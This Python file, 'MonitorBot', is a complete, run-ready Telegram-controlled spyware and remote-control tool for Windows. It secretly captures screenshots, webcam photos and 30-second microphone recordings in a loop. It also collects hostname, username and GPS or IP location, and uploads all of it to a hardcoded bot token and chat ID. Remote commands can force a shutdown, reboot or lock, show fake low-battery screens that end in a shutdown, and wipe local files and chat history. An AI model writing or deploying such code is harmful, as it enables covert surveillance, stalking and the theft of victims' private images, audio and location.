"""
🎬 MonitorBot — Full Integrated Run-Ready Version
Features:
- Startup capture (desktop + webcam)
- Loop: desktop + webcam + audio every `loop_delay`
- Commands: /monitoron, /monitoroff, /screenshot, /photo, /shutdown, /reboot, /lock,
  /uptime, /status, /startloop, /stoploop, /setdelay, /location, /historyclear
- /fakelow [percent] — fake battery overlay
- /fakelowshutdown — battery drop simulation + shutdown
- /note <message> — popup note
"""

import ctypes
import os, time, socket, platform, getpass, threading, subprocess
from datetime import datetime
import logging, requests, mss, mss.tools, cv2, numpy as np, sounddevice as sd
from scipy.io.wavfile import write
import psutil
import tkinter as tk
from threading import Thread
import re

try: import winsound
except: winsound=None

# ---------------- Config ----------------
TEMP_DIR = os.getenv("TEMP", r"C:\Windows\Temp")
QUEUE_DIR = os.path.join(TEMP_DIR, "MonitorQueue")
os.makedirs(QUEUE_DIR, exist_ok=True)

AUDIO_DURATION = 30
AUDIO_FS = 44100
UPLOAD_TIMEOUT = 60
LOG_FILE = os.path.join(TEMP_DIR, "monitor_log.txt")

TOKEN = "8375011972:AAF5NvgWpB_ERP1hqjmcrUpoMz3q8pd5JO4"
CHAT_ID = "5846327099"

loop_delay = 30
loop_running = False
loop_thread = None
monitor_active = True
offset = None
DEBUG_MODE = True

# ---------------- Logging ----------------
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG if DEBUG_MODE else logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %I:%M:%S %p'
)
def log_debug(msg): 
    if DEBUG_MODE: logging.debug(msg)
def log_error(msg): logging.error(msg)

# ---------------- Network ----------------
def network_available():
    try: socket.create_connection(("8.8.8.8", 53), timeout=3); return True
    except: return False

# ---------------- Telegram Bot ----------------
class TelegramBot:
    def __init__(self, token=TOKEN, chat_id=CHAT_ID):
        self.token = token
        self.chat_id = chat_id
    def _post(self, method, data=None, files=None, timeout=UPLOAD_TIMEOUT):
        url = f"https://api.telegram.org/bot{self.token}/{method}"
        try:
            r = requests.post(url, data=data, files=files, timeout=timeout) if files else requests.post(url, data=data, timeout=timeout)
            log_debug(f"Telegram POST {method} status={r.status_code}")
            return r
        except Exception as e: log_error(f"Telegram request failed ({method}): {e}"); return None
    def send_message(self, text):
        data={"chat_id":self.chat_id,"text":text,"parse_mode":"Markdown"}
        r=self._post("sendMessage",data=data)
        return bool(r and r.status_code==200)
    def send_file(self, file_path, file_type="photo", caption=None):
        method,param=("sendPhoto","photo") if file_type=="photo" else ("sendAudio","audio") if file_type=="audio" else ("sendDocument","document")
        try:
            with open(file_path,"rb") as f:
                data={"chat_id":self.chat_id}
                if caption: data["caption"]=caption
                r=requests.post(f"https://api.telegram.org/bot{self.token}/{method}", data=data, files={param:f}, timeout=UPLOAD_TIMEOUT)
            log_debug(f"File sent {file_path}, type={file_type}")
            return bool(r and r.status_code==200)
        except Exception as e: log_error(f"send_file failed: {e}"); return False
    def send_location(self, lat, lon):
        data={"chat_id":self.chat_id,"latitude":lat,"longitude":lon}
        r=self._post("sendLocation",data=data)
        return bool(r and r.status_code==200)

# ---------------- Utilities ----------------
def timestamp_now():
    # আগে সময়, পরে তারিখ (eg: 03:45:12 PM — 2025-10-08)
    return datetime.now().strftime("%I:%M:%S %p — %Y-%m-%d")

# ---------------- Capture Manager ----------------
class CaptureManager:
    def __init__(self, queue_dir=QUEUE_DIR, webcam_warmup=1.0):
        self.queue_dir = queue_dir
        self.webcam_warmup = webcam_warmup
    def capture_desktop(self):
        now=datetime.now().strftime("%Y%m%d_%H%M%S")
        path=os.path.join(self.queue_dir,f"desktop_{now}.png")
        try:
            with mss.mss() as sct:
                monitor=sct.monitors[0]; img=sct.grab(monitor)
                mss.tools.to_png(img.rgb,img.size,output=path)
            self._add_timestamp(path); log_debug(f"Desktop captured: {path}"); return path
        except Exception as e: log_error(f"capture_desktop failed: {e}"); return None
    def capture_webcam(self):
        now=datetime.now().strftime("%Y%m%d_%H%M%S")
        path=os.path.join(self.queue_dir,f"webcam_{now}.png")
        cam=None
        try:
            cam=cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cam.isOpened(): log_error("Webcam not available"); return None
            start=time.time()
            while time.time()-start<self.webcam_warmup: cam.read(); time.sleep(0.05)
            ret,frame=cam.read()
            if ret and frame is not None: cv2.imwrite(path,frame); self._add_timestamp(path); log_debug(f"Webcam captured: {path}"); return path
            return None
        except Exception as e: log_error(f"capture_webcam failed: {e}"); return None
        finally: cam and cam.release()
    def record_audio(self):
        now=datetime.now().strftime("%Y%m%d_%H%M%S")
        path=os.path.join(self.queue_dir,f"audio_{now}.wav")
        try:
            frames=int(AUDIO_DURATION*AUDIO_FS)
            rec=sd.rec(frames,samplerate=AUDIO_FS,channels=1,dtype='float32')
            sd.wait()
            if rec.size==0: log_error("record_audio empty"); return None
            scaled=rec/np.max(np.abs(rec)) if np.max(np.abs(rec))>0 else rec
            write(path,AUDIO_FS,np.int16(scaled*32767))
            log_debug(f"Audio recorded: {path}"); return path
        except Exception as e: log_error(f"record_audio failed: {e}"); return None
    def _add_timestamp(self,path):
        try:
            img=cv2.imread(path)
            if img is None: return
            ts=timestamp_now()
            cv2.putText(img,ts,(10,img.shape[0]-10),cv2.FONT_HERSHEY_SIMPLEX,0.6,(0,255,255),2,cv2.LINE_AA)
            cv2.imwrite(path,img)
        except Exception as e: log_error(f"_add_timestamp failed: {e}")

# ---------------- Geo & System ----------------
try:
    import asyncio
    import winrt.windows.devices.geolocation as wdg
except ImportError:
    wdg = None

def get_gps_location():
    if not wdg:
        return None
    async def get_pos():
        locator = wdg.Geolocator()
        pos = await locator.get_geoposition_async()
        coord = pos.coordinate.point.position
        return {"latitude": coord.latitude, "longitude": coord.longitude}
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(get_pos())
    except Exception as e:
        log_error(f"get_gps_location failed: {e}")
        return None

def get_geo_ip_info():
    # Try GPS first
    gps = get_gps_location()
    if gps:
        return {
            "ip": "N/A",
            "city": "N/A",
            "region": "N/A",
            "country": "N/A",
            "latitude": gps["latitude"],
            "longitude": gps["longitude"]
        }
    # Fallback to IP-based
    try:
        r = requests.get("https://ipinfo.io/json", timeout=6)
        log_debug(f"Geo API status: {r.status_code}, text: {r.text}")
        if r.ok:
            d = r.json()
            loc = d.get("loc", ",").split(",")
            return {
                "ip": d.get("ip", "N/A"),
                "city": d.get("city", "N/A"),
                "region": d.get("region", "N/A"),
                "country": d.get("country", "N/A"),
                "latitude": float(loc[0]) if len(loc) == 2 else None,
                "longitude": float(loc[1]) if len(loc) == 2 else None
            }
    except Exception as e:
        log_error(f"get_geo_ip_info failed: {e}")
    return {"ip": "N/A", "city": "N/A", "region": "N/A", "country": "N/A", "latitude": None, "longitude": None}

def build_location_message():
    hostname=platform.node()
    user=getpass.getuser()
    os_info=f"{platform.system()} {platform.release()} ({platform.version()})"
    cpu_cores=psutil.cpu_count(logical=True)
    ram_gb=round(psutil.virtual_memory().total/(1024**3),2)
    batt=None
    try: batt=psutil.sensors_battery()
    except: pass
    batt_str=f"{int(batt.percent)}% ({'Charging' if batt.power_plugged else 'Not charging'})" if batt else "N/A"
    net_status="Connected" if network_available() else "Disconnected"
    now=timestamp_now(); geo=get_geo_ip_info()
    lat = geo.get('latitude')
    lon = geo.get('longitude')
    latlon_str = f"{lat}, {lon}" if lat and lon else "N/A"
    msg=f"""💻 *Device & Location Info*
━━━━━━━━━━━━━━━━━━━━━━
💡 Quick Summary
• 🌐 Network: {net_status}
• 🔋 Battery: {batt_str}
• 🌍 IP: {geo.get('ip','N/A')}
• 🕒 Time: {now}

💻 System Info
• 🖥 Hostname: {hostname}
• 👤 User: {user}
• 🛠 OS: {os_info}
• 🧠 CPU cores: {cpu_cores}
• 💾 RAM: {ram_gb} GB

📍 Geo (IP-based)
• City: {geo.get('city','N/A')}
• Region: {geo.get('region','N/A')}
• Country: {geo.get('country','N/A')}
• Lat/Lon: {latlon_str}
"""
    return msg, geo

# ---------------- Popups ----------------
note_lock=threading.Lock()
current_note={"thread":None,"message":None,"win":None}
def _show_note_popup(message,duration=5):
    def runner(msg,dur):
        try:
            with note_lock:
                prev_win=current_note.get("win")
                if prev_win: 
                    try: prev_win.destroy()
                    except: pass
                    current_note["win"]=None
            root=tk.Tk(); root.withdraw(); win=tk.Toplevel(root)
            win.overrideredirect(True); win.attributes("-topmost",True)
            screen_w,screen_h=win.winfo_screenwidth(),win.winfo_screenheight()
            w,h=600,150; x,y=screen_w-w-50,screen_h-h-100
            win.geometry(f"{w}x{h}+{x}+{y}")
            frame=tk.Frame(win,bg="#1B1B1B",bd=3,relief=tk.RIDGE); frame.pack(expand=True,fill=tk.BOTH)
            label=tk.Label(frame,text=msg,font=("Segoe UI",24,'bold'),fg="#00FFFF",bg="#1B1B1B",justify=tk.CENTER,wraplength=560)
            label.pack(padx=15,pady=15)
            with note_lock: current_note["win"]=win; current_note["message"]=msg
            import random
            colors=["#00FFFF","#FF00FF","#FFFF00","#FF4500","#00FF00"]
            start_time=time.time()
            def animate():
                if time.time()-start_time<dur: label.config(fg=random.choice(colors)); win.after(300,animate)
                else: 
                    try: win.destroy()
                    except: pass
                    try: root.destroy()
                    except: pass
                    with note_lock: current_note["win"]=None; current_note["message"]=None
            animate(); win.mainloop()
        except Exception as e: log_error(f"_show_note_popup failed: {e}")
    t=Thread(target=runner,args=(message,duration),daemon=True)
    t.start()
    with note_lock: current_note["thread"]=t

# ---------------- Fake Low ----------------
def _fake_low_battery_overlay(percent=20,duration=8):
    def runner():
        try:
            root=tk.Tk(); root.title("Battery Alert")
            root.attributes('-fullscreen',True); root.attributes('-topmost',True); root.configure(bg='black')
            try: root.attributes('-alpha',0.55)
            except: pass
            frame=tk.Frame(root,bg='black'); frame.pack(expand=True,fill=tk.BOTH)
            lbl=tk.Label(frame,text=f"⚠️ Low Battery — {percent}% remaining",font=("Segoe UI",48,'bold'),fg='white',bg='black')
            lbl.pack(pady=40)
            canvas=tk.Canvas(frame,width=80,height=80,bg='black',highlightthickness=0); canvas.pack()
            circle=canvas.create_oval(5,5,75,75,fill='red')
            import random
            if winsound and platform.system().lower().startswith('win'): 
                try:winsound.Beep(1000,300)
                except: pass
            end=time.time()+duration; visible=True
            colors=["red","orange","yellow","white"]
            while time.time()<end:
                canvas.itemconfigure(circle,fill=random.choice(colors) if visible else 'black')
                lbl.config(fg=random.choice(["white","yellow","red"]))
                try: a=0.55+(0.1*random.random()) if visible else 0.35; root.attributes('-alpha',a)
                except: pass
                try: root.update()
                except: break
                time.sleep(0.4); visible=not visible
            root.destroy()
        except Exception as e: log_error(f"_fake_low_battery_overlay failed: {e}")
        try: root.destroy()
        except: pass
    Thread(target=runner,daemon=True).start()

def _fake_low_battery_shutdown():
    def runner():
        try:
            percent_steps=list(range(50,-1,-10)); interval=600
            for pct in percent_steps:
                _fake_low_battery_overlay(percent=pct,duration=5)
                time.sleep(interval)
            if platform.system().lower().startswith("win"): os.system("shutdown /s /t 5")
        except Exception as e: log_error(f"_fake_low_battery_shutdown failed: {e}")
    Thread(target=runner,daemon=True).start()

# ---------------- Startup Capture ----------------
def startup_capture(bot,capture_mgr):
    bot.send_message(f"🔔 *Startup capture initiated* — {timestamp_now()}")
    files=[(capture_mgr.capture_desktop(),"photo"),(capture_mgr.capture_webcam(),"photo")]
    for fpath,ftype in files:
        if fpath and network_available(): bot.send_file(fpath,ftype)
        try: os.remove(fpath)
        except: pass
    bot.send_message(f"✅ *Startup capture completed* — {timestamp_now()}")

# ---------------- Loop ----------------
def loop_worker(bot,capture_mgr):
    global loop_running, loop_delay
    while loop_running:
        start=time.time()
        if monitor_active:
            try:
                files=[(capture_mgr.record_audio(),"audio"),(capture_mgr.capture_desktop(),"photo"),(capture_mgr.capture_webcam(),"photo")]
                for fpath,ftype in files:
                    if fpath and network_available(): bot.send_file(fpath,ftype)
                    try:
                        if fpath and os.path.exists(fpath):
                            os.remove(fpath)
                    except Exception as e:
                        log_error(f"Failed to remove file {fpath}: {e}")
            except Exception as e: log_error(f"loop_worker error: {e}")
        time.sleep(max(0,loop_delay-(time.time()-start)))

def start_loop(bot,capture_mgr):
    global loop_running, loop_thread
    if loop_running: 
        bot.send_message("⚠️ *Loop already running!*\n\n⏰ _MonitorBot is already capturing in a loop._")
        return
    loop_running=True
    loop_thread=threading.Thread(target=loop_worker,args=(bot,capture_mgr),daemon=True)
    loop_thread.start()
    bot.send_message(f"▶️ *Loop started!*\n\nInterval: `{loop_delay}` seconds\n🕒 {timestamp_now()}")

def stop_loop(bot=None):
    global loop_running
    if not loop_running:
        if bot: bot.send_message("⏸ *Loop is not running!*\n\n_No active capture loop found._")
        return
    loop_running=False
    if bot: bot.send_message(f"⏹ *Loop stopped!*\n\n🕒 {timestamp_now()}")

# ---------------- History ----------------
def clear_local_storage():
    try:
        for f in os.listdir(QUEUE_DIR):
            fpath=os.path.join(QUEUE_DIR,f)
            if os.path.isfile(fpath): os.remove(fpath)
        log_debug("Local storage cleared")
    except Exception as e: log_error(f"clear_local_storage failed: {e}")

def clear_bot_chat(bot):
    global offset
    try:
        resp = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", params={"timeout": 10}, timeout=15)
        if resp.status_code != 200:
            return
        for update in resp.json().get("result", []):
            msg = update.get("message")
            if not msg:
                continue
            chat_id = msg.get("chat", {}).get("id")
            message_id = msg.get("message_id")
            # Only delete messages sent by the bot itself
            if str(chat_id) == CHAT_ID and msg.get("from", {}).get("is_bot"):
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/deleteMessage",
                    data={"chat_id": chat_id, "message_id": message_id}
                )
        log_debug("Bot chat cleared")
    except Exception as e:
        log_error(f"clear_bot_chat failed: {e}")

# ---------------- Help Text ----------------
def get_help_text():
    return f"""🎯 *MonitorBot — Commands Overview*

💡 *Monitoring Controls*
• `/monitoron` — Activate monitoring
• `/monitoroff` — Pause monitoring
• `/startloop` — Start automatic capture loop
• `/stoploop` — Stop loop
• `/setdelay <secs>` — Set loop delay

📸 *Captures*
• `/screenshot` — Capture desktop
• `/photo` — Capture webcam

💻 *System Info*
• `/status` — CPU, RAM, IP
• `/uptime` — System uptime
• `/location` — Device & location info

🔒 *System Actions*
• `/shutdown` — Shutdown
• `/reboot` — Reboot
• `/lock` — Lock workstation

🗑️ *Storage & History*
• `/historyclear` — Clear local queue & chat

🆘 *Misc*
• `/fakelow [percent]` — Fake battery overlay
• `/fakelowshutdown` — Battery drop simulation
• `/note <message>` — Popup note
• `/help` — Show this menu
"""

# ---------------- Command Handler ----------------
def handle_telegram_commands(bot,capture_mgr):
    global offset, monitor_active, loop_delay
    while True:
        try:
            params={"timeout":20}
            if offset is not None: params["offset"]=offset
            resp=requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates",params=params,timeout=25)
            if resp.status_code!=200: time.sleep(2); continue
            results=resp.json().get("result",[])
            if not results: continue
            for update in results:
                update_id=update.get("update_id")
                msg=update.get("message",{})
                text=msg.get("text","").strip()
                chat_id=str(msg.get("chat",{}).get("id",""))
                offset=update_id+1
                if chat_id!=CHAT_ID: continue
                # ---- Command Parsing ----
                if text.startswith("/monitoron"):
                    monitor_active = True
                    bot.send_message(f"🟢 *Monitoring Activated!*\n\n_MonitorBot is now actively watching over your system._\n\n🕒 {timestamp_now()}")

                elif text.startswith("/monitoroff"):
                    monitor_active = False
                    bot.send_message(f"🟡 *Monitoring Paused!*\n\n_All monitoring actions are now paused._\n\n🕒 {timestamp_now()}")

                elif text.startswith("/startloop"):
                    start_loop(bot, capture_mgr)
                    # start_loop ফাংশনেও timestamp যুক্ত আছে

                elif text.startswith("/stoploop"):
                    stop_loop(bot)
                    # stop_loop ফাংশনেও timestamp যুক্ত আছে

                elif text.startswith("/setdelay"): 
                    try:
                        val = int(text.split(" ")[1])
                        loop_delay = max(5, val)
                        bot.send_message(f"⏲️ *Loop delay set to* `{loop_delay}` *seconds!*")
                    except:
                        bot.send_message("❌ *Invalid delay value!*\n\n_Please provide a valid number of seconds (minimum 5)._")
                elif text.startswith("/screenshot"): f=capture_mgr.capture_desktop(); f and bot.send_file(f,"photo")
                elif text.startswith("/photo"): f=capture_mgr.capture_webcam(); f and bot.send_file(f,"photo")
                elif text.startswith("/status"): msg=f"💻 CPU:{psutil.cpu_percent()}% RAM:{round(psutil.virtual_memory().percent,1)}%"; bot.send_message(msg)
                elif text.startswith("/uptime"):
                    try:
                        uptime_seconds = time.time() - psutil.boot_time()
                        hours = int(uptime_seconds // 3600)
                        minutes = int((uptime_seconds % 3600) // 60)
                        seconds = int(uptime_seconds % 60)
                        msg = f"⏱ Uptime: {hours}h {minutes}m {seconds}s"
                    except Exception as e:
                        msg = "⏱ Uptime: N/A"
                    bot.send_message(msg)
                elif text.startswith("/location"):
                    msg, geo = build_location_message()
                    bot.send_message(msg)
                    lat = geo.get("latitude")
                    lon = geo.get("longitude")
                    if lat is not None and lon is not None:
                        bot.send_location(lat, lon)
                elif text.startswith("/shutdown"): os.system("shutdown /s /t 5")
                elif text.startswith("/reboot"): os.system("shutdown /r /t 5")
                elif text.startswith("/lock"):
                    if platform.system().lower().startswith("win"): ctypes.windll.user32.LockWorkStation()
                elif text.startswith("/historyclear"):
                    clear_local_storage()
                    clear_bot_chat(bot)
                    bot.send_message(f"🗑️ *History Cleared!*\n\n_All local files and bot messages have been deleted._\n\n🕒 {timestamp_now()}")
                elif text.startswith("/fakelowshutdown"): _fake_low_battery_shutdown()
                elif text.startswith("/fakelow"):
                    match = re.match(r"/fakelow\s*(\d+)?", text)
                    pct = 20
                    if match and match.group(1):
                        try:
                            pct = int(match.group(1))
                            pct = max(1, min(100, pct))
                        except:
                            pct = 20
                    _fake_low_battery_overlay(percent=pct)
                elif text.startswith("/note"):
                    msg = text[6:].strip()
                    if msg:
                        _show_note_popup(msg)
                        bot.send_message(f"📝 *Note shown on screen:*\n_{msg}_\n\n🕒 {timestamp_now()}")
                elif text.startswith("/help"): bot.send_message(get_help_text())
        except Exception as e: log_error(f"handle_telegram_commands error: {e}")
        time.sleep(2)

# ---------------- Main ----------------
def main():
    bot=TelegramBot()
    capture_mgr=CaptureManager(webcam_warmup=1.0)
    if network_available(): bot.send_message(f"🎬 MonitorBot Started — {timestamp_now()}"); threading.Thread(target=startup_capture,args=(bot,capture_mgr),daemon=True).start()
    threading.Thread(target=handle_telegram_commands,args=(bot,capture_mgr),daemon=True).start()
    start_loop(bot,capture_mgr)
    try:
        while True: time.sleep(5)
    except KeyboardInterrupt: stop_loop(bot); bot.send_message(f"🛑 MonitorBot terminated — {timestamp_now()}")

if __name__=="__main__": main()
# MonitorBot — Full Integrated Run-Ready Version